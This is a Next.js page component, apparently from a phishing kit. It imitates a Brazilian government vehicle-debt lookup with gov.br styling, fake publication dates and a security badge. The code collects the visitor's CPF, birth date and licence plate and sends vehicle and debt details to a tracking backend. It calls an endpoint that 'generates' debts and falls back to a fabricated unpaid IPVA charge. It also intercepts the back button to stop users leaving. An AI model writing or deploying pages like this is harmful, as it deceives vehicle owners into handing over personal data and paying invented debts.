"use client"

import { useState, useEffect } from "react"
import { PlacaStep } from "@/components/placa-step"
import { Header } from "@/components/header"
import { Footer } from "@/components/footer"
import { SecurityBadge } from "@/components/security-badge"
import { consultarPlaca } from "@/app/actions"
import { useTracking } from "@/hooks/use-tracking"
import { useRouter } from "next/navigation"
import { BackRedirectProvider, useBackRedirect } from "@/components/back-redirect-provider"

function VeiculoPageContent() {
  const [carregando, setCarregando] = useState(false)
  const [mensagemCarregamento, setMensagemCarregamento] = useState("")
  const [userData, setUserData] = useState<any>(null)
  const { sessionId, trackingEnabled, trackVehicle, trackDebitos, trackEvent } = useTracking()
  const { showBackRedirect } = useBackRedirect()
  const router = useRouter()

  // Carrega dados do usuário do localStorage
  useEffect(() => {
    const savedUserData = localStorage.getItem("userData")
    if (!savedUserData) {
      router.push("/")
      return
    }

    const parsedData = JSON.parse(savedUserData)
    const thirtyMinutes = 30 * 60 * 1000
    if (Date.now() - parsedData.timestamp > thirtyMinutes) {
      localStorage.removeItem("userData")
      router.push("/")
      return
    }

    setUserData(parsedData)
  }, [router])

  // Tracking de page view
  useEffect(() => {
    if (trackingEnabled && sessionId && userData) {
      trackEvent("page_view", { step: 2, page: "veiculo" }, 2)
    }
  }, [trackingEnabled, sessionId, userData, trackEvent])

  const handlePlacaSubmit = async (placa: string) => {
    try {
      setCarregando(true)
      setMensagemCarregamento("Consultando placa do veículo...")

      if (trackingEnabled && sessionId) {
        trackEvent("placa_search_start", { placa }, 2)
      }

      const resultado = await consultarPlaca(placa)

      if (resultado.success) {
        setMensagemCarregamento("Gerando débitos...")

        const veiculoData = resultado.data
        const uf = veiculoData.uf || veiculoData.UF || "SP"

        if (trackingEnabled && sessionId) {
          trackEvent("vehicle_found", { placa, modelo: veiculoData.MODELO }, 3)
        }

        // Gerar débitos
        const debitosResponse = await fetch("/api/debitos/gerar", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            placa: placa.toUpperCase(),
            uf: uf,
            municipio: veiculoData.municipio || veiculoData.MUNICIPIO || "São Paulo",
          }),
        })

        const debitosData = await debitosResponse.json()
        let debitos = []

        if (debitosData.success && debitosData.debitos) {
          debitos = debitosData.debitos
        } else {
          debitos = [
            {
              tipo: "IPVA",
              ano: new Date().getFullYear().toString(),
              valor: "R$ 150,00",
              status: "Em aberto",
              vencimento: "15/11/2024",
              total: "R$ 150,00",
              orgao: `Secretaria da Fazenda ${uf}`,
            },
          ]
        }

        const vehicleDataForTracking = {
          placa: veiculoData.placa || veiculoData.PLACA || placa.toUpperCase(),
          modelo: veiculoData.MODELO || veiculoData.modelo || "Não informado",
          marca: veiculoData.MARCA || veiculoData.marca || "Não informado",
          ano: veiculoData.ano || "Não informado",
          cor: veiculoData.cor || veiculoData.COR || "Não informado",
          chassi: veiculoData.chassi || veiculoData.CHASSI || "Não informado",
          renavam: veiculoData.renavam || veiculoData.RENAVAM || "Não informado",
          municipio: veiculoData.municipio || veiculoData.MUNICIPIO || "Não informado",
          uf: uf,
          situacao: veiculoData.situacao || veiculoData.SITUACAO || "NORMAL",
        }

        // Salva todos os dados no localStorage
        const completeUserData = {
          ...userData,
          placa,
          veiculo: {
            ...vehicleDataForTracking,
            ano:
              veiculoData.ano && veiculoData.anoModelo
                ? `${veiculoData.ano}/${veiculoData.anoModelo}`
                : "Não informado",
            proprietario_desde: veiculoData.dataAtualizacaoCaracteristicasVeiculo || "Não informado",
          },
          debitos: debitos,
          timestamp: Date.now(),
        }

        localStorage.setItem("userData", JSON.stringify(completeUserData))

        if (trackingEnabled && sessionId && userData.id) {
          console.log("🚗 Fazendo tracking do veículo:", vehicleDataForTracking)
          const vehicleTracked = await trackVehicle(userData.id, vehicleDataForTracking)
          console.log("✅ Veículo tracked:", vehicleTracked)

          // Fazer tracking dos débitos também
          console.log("💰 Fazendo tracking dos débitos:", debitos)
          const debitosTracked = await trackDebitos(userData.id, debitos)
          console.log("✅ Débitos tracked:", debitosTracked)
        }

        if (trackingEnabled && sessionId) {
          trackEvent("debitos_loaded", { total_debitos: debitos.length }, 3)
        }

        // Redireciona instantaneamente
        router.push("/debitos")
      } else {
        setCarregando(false)
        if (trackingEnabled && sessionId) {
          trackEvent("placa_search_error", { placa, error: resultado.error }, 2)
        }
      }
    } catch (error) {
      setCarregando(false)
      if (trackingEnabled && sessionId) {
        trackEvent("placa_search_exception", { placa, error: error.message }, 2)
      }
    }
  }

  const handleVoltar = () => {
    if (trackingEnabled && sessionId) {
      trackEvent("back_button_click", { current_step: 2 }, 2)
    }
    // Mostra o back redirect em vez de navegar diretamente
    showBackRedirect(1)
  }

  if (!userData) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-[#f8f8f8]">
        <div className="animate-spin rounded-full h-32 w-32 border-b-2 border-[#1351B4]"></div>
      </div>
    )
  }

  return (
    <main className="min-h-screen flex flex-col bg-[#f8f8f8]">
      <Header />
      <div className="flex-1 container mx-auto px-4 py-8 max-w-4xl">
        {carregando ? (
          <div className="bg-white p-6 rounded-sm border border-gray-200 shadow-sm flex flex-col items-center justify-center min-h-[400px]">
            <div className="w-16 h-16 border-4 border-[#1351B4] border-t-transparent rounded-full animate-spin mb-4"></div>
            <h2 className="text-xl font-bold text-[#071D41] mb-2">{mensagemCarregamento}</h2>
            <p className="text-[#555555]">Aguarde enquanto processamos sua solicitação</p>
          </div>
        ) : (
          <div className="bg-white p-6 rounded-sm border border-gray-200 shadow-sm">
            <div className="border-b border-gray-200 pb-4 mb-6">
              <h1 className="text-2xl font-bold text-[#071D41]">Consulta de Débitos Veiculares</h1>
              <div className="flex text-sm text-[#555555] mt-1 space-x-4">
                <div>Publicado em 17/12/2023 14h28</div>
                <div>Atualizado em 16/05/2025 14h20</div>
              </div>
            </div>

            {/* Indicador de progresso */}
            <div className="mb-8">
              <div className="flex items-center justify-between">
                <div className="flex flex-col items-center">
                  <div className="rounded-full h-10 w-10 flex items-center justify-center bg-[#1351B4] text-white">
                    ✓
                  </div>
                  <div className="mt-2 text-sm text-[#071D41] font-medium">Identificação</div>
                </div>
                <div className="flex-1 mx-2 h-1 bg-gray-200"></div>
                <div className="flex flex-col items-center">
                  <div className="rounded-full h-10 w-10 flex items-center justify-center bg-[#1351B4] text-white">
                    2
                  </div>
                  <div className="mt-2 text-sm text-[#071D41] font-medium">Veículo</div>
                </div>
                <div className="flex-1 mx-2 h-1 bg-gray-200"></div>
                <div className="flex flex-col items-center">
                  <div className="rounded-full h-10 w-10 flex items-center justify-center bg-gray-200 text-gray-500">
                    3
                  </div>
                  <div className="mt-2 text-sm text-gray-500">Débitos</div>
                </div>
              </div>
            </div>

            <PlacaStep
              nome={userData.nome}
              cpf={userData.cpf}
              dataNascimento={userData.dataNascimento}
              onSubmit={handlePlacaSubmit}
              onVoltar={handleVoltar}
            />
          </div>
        )}

        <div className="mt-6">
          <SecurityBadge />
        </div>
      </div>
      <Footer />
    </main>
  )
}

export default function VeiculoPage() {
  return (
    <BackRedirectProvider>
      <VeiculoPageContent />
    </BackRedirectProvider>
  )
}
